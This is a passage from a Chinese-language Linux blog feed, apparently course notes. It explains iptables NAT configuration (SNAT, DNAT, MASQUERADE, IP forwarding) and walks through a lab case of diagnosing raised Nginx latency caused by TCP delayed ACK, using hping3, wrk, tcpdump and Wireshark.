alt="img"></p><p>（图片来自 <a href="https://en.wikipedia.org/wiki/Iptables">Wikipedia</a>）</p><p>在这张图中，绿色背景的方框，表示表（table），用来管理链。Linux 支持 4 种表，包括 filter（用于过滤）、nat（用于NAT）、mangle（用于修改分组数据） 和 raw（用于原始数据包）等。</p><p>跟 table 一起的白色背景方框，则表示链（chain），用来管理具体的 iptables 规则。每个表中可以包含多条链，比如：</p><ul><li><p>filter 表中，内置 INPUT、OUTPUT 和 FORWARD 链；</p></li><li><p>nat 表中，内置PREROUTING、POSTROUTING、OUTPUT 等。</p></li></ul><p>当然，你也可以根据需要，创建你自己的链。</p><p>灰色的 conntrack，表示连接跟踪模块。它通过内核中的连接跟踪表（也就是哈希表），记录网络连接的状态，是 iptables 状态过滤（-m state）和 NAT 的实现基础。</p><p>iptables 的所有规则，就会放到这些表和链中，并按照图中顺序和规则的优先级顺序来执行。</p><p>要实现 NAT 功能，主要是在 nat 表进行操作。而 nat 表内置了三个链：</p><ul><li><p>PREROUTING，用于路由判断前所执行的规则，比如，对接收到的数据包进行 DNAT。</p></li><li><p>POSTROUTING，用于路由判断后所执行的规则，比如，对发送或转发的数据包进行 SNAT 或 MASQUERADE。</p></li><li><p>OUTPUT，类似于 PREROUTING，但只处理从本机发送出去的包。</p></li></ul><p>熟悉 iptables 中的表和链后，相应的 NAT 规则就比较简单了。下面以 NAPT 的三个分类为例，来具体解读一下。</p><h3 id="SNAT"><a href="#SNAT" class="headerlink" title="SNAT"></a><strong>SNAT</strong></h3><p>SNAT 需要在 nat 表的 POSTROUTING 链中配置。我们常用两种方式来配置它。</p><p>第一种方法，是为一个子网统一配置 SNAT，并由 Linux 选择默认的出口 IP。这实际上就是经常说的 MASQUERADE（地址伪装，灵活分配ip）：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ iptables -t nat -<span class="hljs-keyword">A</span> POSTROUTING -s <span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span> -j MASQUERADE<br><br></code></pre></td></tr></table></figure><p>第二种方法，是为具体的 IP 地址配置 SNAT，并指定转换后的源地址：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ iptables -t nat -<span class="hljs-keyword">A</span> POSTROUTING -s <span class="hljs-number">192.168.0.2</span> -j SNAT --to-source <span class="hljs-number">100.100.100.100</span><br><br></code></pre></td></tr></table></figure><h3 id="DNAT"><a href="#DNAT" class="headerlink" title="DNAT"></a><strong>DNAT</strong></h3><p>DNAT 需要在 nat 表的 PREROUTING 或者 OUTPUT 链中配置，其中， PREROUTING 链更常用一些（因为它还可以用于转发的包）。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ iptables -t nat -<span class="hljs-keyword">A</span> PREROUTING -d <span class="hljs-number">100.100.100.100</span> -j DNAT --to-destination <span class="hljs-number">192.168.0.2</span><br><br></code></pre></td></tr></table></figure><h3 id="双向地址转换"><a href="#双向地址转换" class="headerlink" title="双向地址转换"></a><strong>双向地址转换</strong></h3><p>双向地址转换，就是同时添加 SNAT 和 DNAT 规则，为公网 IP 和内网 IP 实现一对一的映射关系，即：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ iptables -t nat -<span class="hljs-keyword">A</span> POSTROUTING -s <span class="hljs-number">192.168.0.2</span> -j SNAT --to-source <span class="hljs-number">100.100.100.100</span><br>$ iptables -t nat -<span class="hljs-keyword">A</span> PREROUTING -d <span class="hljs-number">100.100.100.100</span> -j DNAT --to-destination <span class="hljs-number">192.168.0.2</span><br><br></code></pre></td></tr></table></figure><p>在使用 iptables 配置 NAT 规则时，Linux 需要转发来自其他 IP 的网络包，所以你千万不要忘记开启 Linux 的 IP 转发功能。</p><p>可以执行下面的命令，查看这一功能是否开启。如果输出的结果是 1，就表示已经开启了 IP 转发：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sysctl net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.ip_forward</span><br>net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.ip_forward</span> = <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>如果还没开启，可以执行下面的命令，手动开启：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sysctl -w net<span class="hljs-selector-class">.ipv4</span>.ip_forward=<span class="hljs-number">1</span><br>net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.ip_forward</span> = <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>为了避免重启后配置丢失，不要忘记将配置写入 &#x2F;etc&#x2F;sysctl.conf 文件中：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ cat <span class="hljs-regexp">/etc/</span>sysctl.conf | <span class="hljs-keyword">grep</span> ip_forward<br>net.ipv4.ip_forward=<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章分析了 Linux 网络地址转换 NAT 的原理。</p><p>NAT 技术能够重写 IP 数据包的源 IP 或目的 IP，所以普遍用来解决公网 IP 地址短缺的问题。它可以让网络中的多台主机，通过共享同一个公网 IP 地址，来访问外网资源。同时，由于 NAT 屏蔽了内网网络，也为局域网中机器起到安全隔离的作用。</p><p>Linux 中的NAT ，基于内核的连接跟踪模块实现。所以，它维护每个连接状态的同时，也会带来很高的性能成本。具体 NAT 性能问题的分析方法，我们将在下节课继续学习。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>。MASQUERADE 是最常用的一种 SNAT 规则，常用来为多个内网 IP 地址提供共享的出口 IP。</p><p>假设现在有一台 Linux 服务器，使用了 MASQUERADE 的方式，为内网的所有 IP 提供出口访问功能。那么，</p><ul><li><p>当多个内网 IP 地址的端口号相同时，MASQUERADE 还可以正常工作吗？</p></li><li><p>如果内网 IP 地址数量或请求数比较多，这种方式有没有什么隐患呢？</p></li></ul><p>问题1：Linux的NAT时给予内核的连接跟踪模块实现，保留了源IP、源端口、目的IP、目的端口之间的关系，多个内网IP地址的端口相同，但是IP不同，再nf_conntrack中对应不同的记录，所以MASQUERADE可以正常工作。 </p><p>问题2：NAT方式所有流量都要经过NAT服务器，所以NAT服务器本身的软中断导致CPU负载、网络流量、文件句柄、端口号上限、nf_conntrack table full都可能是性能瓶颈。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8.如何排查网络请求延迟变大</title>
    <link href="/2022/11/12/8-%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E5%BB%B6%E8%BF%9F%E5%8F%98%E5%A4%A7%E4%BA%86%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F/"/>
    <url>/2022/11/12/8-%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E5%BB%B6%E8%BF%9F%E5%8F%98%E5%A4%A7%E4%BA%86%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="8-如何排查网络请求延迟变大"><a href="#8-如何排查网络请求延迟变大" class="headerlink" title="8.如何排查网络请求延迟变大"></a>8.如何排查网络请求延迟变大</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><h2 id="网络延迟"><a href="#网络延迟" class="headerlink" title="网络延迟"></a>网络延迟</h2><p>提到 <strong>网络延迟</strong> 时，你可能轻松想起它的含义——网络数据传输所用的时间。不过要注意，这个时间可能是单向的，指从源地址发送到目的地址的单程时间；也可能是双向的，即从源地址发送到目的地址，然后又从目的地址发回响应，这个往返全程所用的时间。</p><p>通常，我们更常用的是双向的往返通信延迟，比如 ping 测试的结果，就是往返延时 RTT（Round-Trip Time）。</p><p>除了网络延迟外，另一个常用的指标是 <strong>应用程序延迟</strong>，它是指，从应用程序接收到请求，再到发回响应，全程所用的时间。通常，应用程序延迟也指的是往返延迟，是网络数据传输时间加上数据处理时间的和。</p><p>ping 基于 ICMP 协议，它通过计算 ICMP 回显响应报文与 ICMP 回显请求报文的时间差，来获得往返延时。这个过程并不需要特殊认证，常被很多网络攻击利用，比如端口扫描工具 nmap、组包工具 hping3 等等。</p><p>所以，为了避免这些问题，很多网络服务会把 ICMP 禁止掉，这也就导致我们无法用 ping ，来测试网络服务的可用性和往返延时。这时，可以用 traceroute 或 hping3 的 TCP 和 UDP 模式，来获取网络延迟。</p><p>比如，以 baidu.com 为例，可以执行下面的 hping3 命令，测试机器到百度搜索服务器的网络延迟：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># -c表示发送3次请求，-S表示设置TCP SYN，-p表示端口号为80</span><br>$ hping3 -c 3 -S -p 80 baidu.com<br>HPING baidu.com (eth0 123.125.115.110): S set, 40 headers + 0 data bytes<br><span class="hljs-attribute">len</span>=46 <span class="hljs-attribute">ip</span>=123.125.115.110 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">id</span>=47908 <span class="hljs-attribute">sport</span>=80 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=0 <span class="hljs-attribute">win</span>=8192 <span class="hljs-attribute">rtt</span>=20.9 ms<br><span class="hljs-attribute">len</span>=46 <span class="hljs-attribute">ip</span>=123.125.115.110 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">id</span>=6788  <span class="hljs-attribute">sport</span>=80 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=1 <span class="hljs-attribute">win</span>=8192 <span class="hljs-attribute">rtt</span>=20.9 ms<br><span class="hljs-attribute">len</span>=46 <span class="hljs-attribute">ip</span>=123.125.115.110 <span class="hljs-attribute">ttl</span>=51 <span class="hljs-attribute">id</span>=37699 <span class="hljs-attribute">sport</span>=80 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=2 <span class="hljs-attribute">win</span>=8192 <span class="hljs-attribute">rtt</span>=20.9 ms<br><br>--- baidu.com hping statistic ---<br>3 packets transmitted, 3 packets received, 0% packet loss<br>round-trip min/avg/max = 20.9/20.9/20.9 ms<br><br></code></pre></td></tr></table></figure><p>从 hping3 的结果中，可以看到，往返延迟 RTT 为 20.9ms。</p><p>用 traceroute ，也可以得到类似结果：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># --tcp表示使用TCP协议，-p表示端口号，-n表示不对结果中的IP地址执行反向域名解析</span><br>$ traceroute --tcp -p 80 -n baidu.com<br>traceroute to baidu.com (123.125.115.110), 30 hops max, 60 byte packets<br> 1  <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">*</span><br><span class="hljs-emphasis"> 2  *</span> <span class="hljs-emphasis">* *</span><br> 3  <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">*</span><br><span class="hljs-emphasis"> 4  *</span> <span class="hljs-emphasis">* *</span><br> 5  <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">*</span><br><span class="hljs-emphasis"> 6  *</span> <span class="hljs-emphasis">* *</span><br> 7  <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">*</span><br><span class="hljs-emphasis"> 8  *</span> <span class="hljs-emphasis">* *</span><br> 9  <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">*</span><br><span class="hljs-emphasis">10  *</span> <span class="hljs-emphasis">* *</span><br>11  <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">*</span><br><span class="hljs-emphasis">12  *</span> <span class="hljs-emphasis">* *</span><br>13  <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">*</span><br><span class="hljs-emphasis">14  123.125.115.110  20.684 ms *</span>  20.798 ms<br><br></code></pre></td></tr></table></figure><p>traceroute 会在路由的每一跳发送三个包，并在收到响应后，输出往返延时。如果无响应或者响应超时（默认5s），就会输出一个星号。</p><p>知道了基于 TCP 测试网络服务延迟的方法后，接下来，我们就通过一个案例，来学习网络延迟升高时的分析思路。</p><h2 id="案例准备"><a href="#案例准备" class="headerlink" title="案例准备"></a>案例准备</h2><p>下面的案例仍然基于 Ubuntu 18.04，同样适用于其他的 Linux 系统。环境如下：</p><ul><li><p>机器配置：2 CPU，8GB 内存。</p></li><li><p>预先安装 docker、hping3、tcpdump、curl、wrk、Wireshark 等工具，比如 apt-get install docker.io hping3 tcpdump curl。</p></li></ul><p>由于Wireshark 需要图形界面，如果你的虚拟机没有图形界面，就可以把 Wireshark 安装到其他的机器中（比如 Windows 笔记本）。</p><p>本次案例用到两台虚拟机，关系如下：</p><p><img src="https://static001.geekbang.org/resource/image/55/63/55347dc1ec78688da5673f29b60aa863.png?wh=816*516" alt="img"></p><p>接下来，打开两个终端，分别 SSH 登录到两台机器上（以下步骤，假设终端编号与图示VM 编号一致），并安装上面提到的这些工具。</p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>为了对比得出延迟增大的影响，首先在终端一中，执行下面的命令，运行官方 Nginx，它会在 80 端口监听：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-built_in">run</span> <span class="hljs-attribute">--network</span>=host <span class="hljs-attribute">--name</span>=good -itd nginx<br>fb4ed7cb9177d10e270f8320a7fb64717eac3451114c9fab3c50e02be2e88ba2<br><br></code></pre></td></tr></table></figure><p>继续在终端一中，执行下面的命令，运行案例应用，它会监听 8080 端口：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-built_in">run</span> --name nginx <span class="hljs-attribute">--network</span>=host -itd feisky/nginx:latency<br>b99bd136dcfd907747d9c803fdc0255e578bad6d66f4e9c32b826d75b6812724<br><br></code></pre></td></tr></table></figure><p>然后，在终端二中执行 curl 命令，验证两个容器已经正常启动。输出如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"># 80端口正常<br>$ curl http://192.168.0.30<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Thank you for using nginx.<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br># 8080端口正常<br>$ curl http://192.168.0.30:8080<br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Thank you for using nginx.<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>接着，我们再用 hping3来测试它们的延迟，看看有什么区别。还是在终端二，执行下面的命令，分别测试案例机器 80 端口和 8080 端口的延迟：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 测试80端口延迟</span><br>$ hping3 -c 3 -S -p 80 192.168.0.30<br>HPING 192.168.0.30 (eth0 192.168.0.30): S set, 40 headers + 0 data bytes<br><span class="hljs-attribute">len</span>=44 <span class="hljs-attribute">ip</span>=192.168.0.30 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=0 <span class="hljs-attribute">sport</span>=80 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=0 <span class="hljs-attribute">win</span>=29200 <span class="hljs-attribute">rtt</span>=7.8 ms<br><span class="hljs-attribute">len</span>=44 <span class="hljs-attribute">ip</span>=192.168.0.30 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=0 <span class="hljs-attribute">sport</span>=80 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=1 <span class="hljs-attribute">win</span>=29200 <span class="hljs-attribute">rtt</span>=7.7 ms<br><span class="hljs-attribute">len</span>=44 <span class="hljs-attribute">ip</span>=192.168.0.30 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=0 <span class="hljs-attribute">sport</span>=80 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=2 <span class="hljs-attribute">win</span>=29200 <span class="hljs-attribute">rtt</span>=7.6 ms<br><br>--- 192.168.0.30 hping statistic ---<br>3 packets transmitted, 3 packets received, 0% packet loss<br>round-trip min/avg/max = 7.6/7.7/7.8 ms<br><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 测试8080端口延迟</span><br>$ hping3 -c 3 -S -p 8080 192.168.0.30<br>HPING 192.168.0.30 (eth0 192.168.0.30): S set, 40 headers + 0 data bytes<br><span class="hljs-attribute">len</span>=44 <span class="hljs-attribute">ip</span>=192.168.0.30 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=0 <span class="hljs-attribute">sport</span>=8080 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=0 <span class="hljs-attribute">win</span>=29200 <span class="hljs-attribute">rtt</span>=7.7 ms<br><span class="hljs-attribute">len</span>=44 <span class="hljs-attribute">ip</span>=192.168.0.30 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=0 <span class="hljs-attribute">sport</span>=8080 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=1 <span class="hljs-attribute">win</span>=29200 <span class="hljs-attribute">rtt</span>=7.6 ms<br><span class="hljs-attribute">len</span>=44 <span class="hljs-attribute">ip</span>=192.168.0.30 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=0 <span class="hljs-attribute">sport</span>=8080 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=2 <span class="hljs-attribute">win</span>=29200 <span class="hljs-attribute">rtt</span>=7.3 ms<br><br>--- 192.168.0.30 hping statistic ---<br>3 packets transmitted, 3 packets received, 0% packet loss<br>round-trip min/avg/max = 7.3/7.6/7.7 ms<br><br></code></pre></td></tr></table></figure><p>从这个输出你可以看到，两个端口的延迟差不多，都是 7ms。不过，这只是单个请求的情况。换成并发请求的话，又会怎么样呢？</p><p>接下来，我们就用 wrk 试试。这次在终端二中，执行下面的新命令，分别测试案例机器并发 100 时， 80 端口和 8080 端口的性能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 测试80端口性能</span><br>$ <span class="hljs-comment"># wrk --latency -c 100 -t 2 --timeout 2 http://192.168.0.30/</span><br>Running 10s <span class="hljs-built_in">test</span> @ http://192.168.0.30/<br>  2 threads and 100 connections<br>  Thread Stats   Avg      Stdev     Max   +/- Stdev<br>    Latency     9.19ms   12.32ms 319.61ms   97.80%<br>    Req/Sec     6.20k   426.80     8.25k    85.50%<br>  Latency Distribution<br>     50%    7.78ms<br>     75%    8.22ms<br>     90%    9.14ms<br>     99%   50.53ms<br>  123558 requests <span class="hljs-keyword">in</span> 10.01s, 100.15MB <span class="hljs-built_in">read</span><br>Requests/sec:  12340.91<br>Transfer/sec:     10.00MB<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 测试8080端口性能</span><br>$ wrk --latency -c 100 -t 2 --<span class="hljs-built_in">timeout</span> 2 http://192.168.0.30:8080/<br>Running 10s <span class="hljs-built_in">test</span> @ http://192.168.0.30:8080/<br>  2 threads and 100 connections<br>  Thread Stats   Avg      Stdev     Max   +/- Stdev<br>    Latency    43.60ms    6.41ms  56.58ms   97.06%<br>    Req/Sec     1.15k   120.29     1.92k    88.50%<br>  Latency Distribution<br>     50%   44.02ms<br>     75%   44.33ms<br>     90%   47.62ms<br>     99%   48.88ms<br>  22853 requests <span class="hljs-keyword">in</span> 10.01s, 18.55MB <span class="hljs-built_in">read</span><br>Requests/sec:   2283.31<br>Transfer/sec:      1.85MB<br><br></code></pre></td></tr></table></figure><p>从上面两个输出可以看到，官方Nginx（监听在80端口）的平均延迟是 9.19ms，而案例 Nginx 的平均延迟（监听在 8080 端口）则是 43.6ms。从延迟的分布上来看，官方 Nginx 90% 的请求，都可以在 9ms以内完成；而案例 Nginx 50% 的请求，就已经达到了 44 ms。</p><p>再结合上面 hping3 的输出，我们很容易发现，案例 Nginx 在并发请求下的延迟增大了很多，这是怎么回事呢？</p><p>接下来，我们在终端一中，执行下面的 <strong>tcpdump</strong> 命令，抓取 8080 端口上收发的网络包，并保存到 nginx.pcap 文件：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>tcpdump -nn tcp port <span class="hljs-number">8080</span> -w nginx.pcap<br><br></code></pre></td></tr></table></figure><p>然后切换到终端二中，重新执行 wrk 命令：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 测试8080端口性能</span><br>$ wrk <span class="hljs-params">--latency</span> -c 100 -t 2 <span class="hljs-params">--timeout</span> 2 http:<span class="hljs-string">//192.168.0.30</span><span class="hljs-function">:8080</span>/<br><br></code></pre></td></tr></table></figure><p>当 wrk 命令结束后，再次切换回终端一，并按下 Ctrl+C 结束 tcpdump 命令。然后，再把抓取到的 nginx.pcap ，复制到装有 Wireshark 的机器中（如果 VM1 已经带有图形界面，那么可以跳过复制步骤），并用 Wireshark 打开它。</p><p>由于网络包的数量比较多，可以先过滤一下。比如，在选择一个包后，可以单击右键并选择 “Follow” -&gt; “TCP Stream”，如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/45/98/4590d2477d54bf9aa3d2881ff3296498.png?wh=453*372" alt="img"></p><p>然后，关闭弹出来的对话框，回到 Wireshark 主窗口。会发现 Wireshark 已经自动帮你设置了一个过滤表达式 tcp.stream eq 24。如下图所示（图中省去了源和目的IP地址）：</p><p><img src="https://static001.geekbang.org/resource/image/f9/6e/f9fa457f95276ae4904a91619501376e.png?wh=761*295" alt="img"></p><p>从这里，可以看到这个 TCP 连接从三次握手开始的每个请求和响应情况。如果觉得不够直观，可以继续点击菜单栏里的 Statics -&gt; Flow Graph，选中 “Limit to display filter” 并设置 Flow type 为 “TCP Flows”：</p><p><img src="https://static001.geekbang.org/resource/image/ff/cc/ff498170eb58abcdd841709fb4c036cc.png?wh=722*471" alt="img"></p><p>注意，这个图的左边是客户端，而右边是 Nginx 服务器。通过这个图就可以看出，前面三次握手，以及第一次 HTTP 请求和响应还是挺快的，但第二次 HTTP 请求就比较慢了，特别是客户端在收到服务器第一个分组后，40ms 后才发出了 ACK 响应（图中蓝色行）。</p><p>40ms 这个值，这是 TCP 延迟确认（Delayed ACK）的最小超时时间。</p><p>关于延迟确认。这是针对 TCP ACK 的一种优化机制，也就是说，不用每次请求都发送一个 ACK，而是先等一会儿（比如 40ms），看看有没有“顺风车”。如果这段时间内，正好有其他包需要发送，那就捎带着 ACK 一起发送过去。当然，如果一直等不到其他包，那就超时后单独发送 ACK。</p><p>因为案例中 40ms 发生在客户端上，我们有理由怀疑，是客户端开启了延迟确认机制。而这儿的客户端，实际上就是前面运行的 wrk。</p><p>查询 TCP 文档（执行 man tcp），只有 TCP 套接字专门设置了 TCP_QUICKACK ，才会开启快速确认模式；否则，默认情况下，采用的就是延迟确认机制：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">TCP_QUICKACK (since Linux <span class="hljs-number">2.4</span>.<span class="hljs-number">4</span>)<br>              Enable  quickack <span class="hljs-keyword">mode</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">set</span> <span class="hljs-built_in">or</span> disable quickack <span class="hljs-keyword">mode</span> <span class="hljs-keyword">if</span> cleared.  In quickack <span class="hljs-keyword">mode</span>, acks are sent imme‐<br>              diately, rather than delayed <span class="hljs-keyword">if</span> needed in accordance <span class="hljs-keyword">to</span> <span class="hljs-keyword">normal</span> TCP operation.  This flag <span class="hljs-keyword">is</span>  not  perma‐<br>              nent,  it <span class="hljs-keyword">only</span> enables <span class="hljs-keyword">a</span> switch <span class="hljs-keyword">to</span> <span class="hljs-built_in">or</span> from quickack <span class="hljs-keyword">mode</span>.  Subsequent operation of the TCP protocol will<br>              once again enter/leave quickack <span class="hljs-keyword">mode</span> depending <span class="hljs-keyword">on</span> internal  protocol  processing  <span class="hljs-built_in">and</span>  factors  such  <span class="hljs-keyword">as</span><br>              delayed ack timeouts occurring <span class="hljs-built_in">and</span> data transfer.  This option should not <span class="hljs-keyword">be</span> used in code intended <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span><br>              portable.<br><br></code></pre></td></tr></table></figure><p>为了验证我们的猜想，确认 wrk 的行为，我们可以用 strace ，来观察 wrk 为套接字设置了哪些 TCP 选项。</p><p>切换到终端二中，执行下面的命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ strace -f wrk <span class="hljs-attr">--latency</span> -c <span class="hljs-number">100</span> -t <span class="hljs-number">2</span> <span class="hljs-attr">--timeout</span> <span class="hljs-number">2</span> http:<span 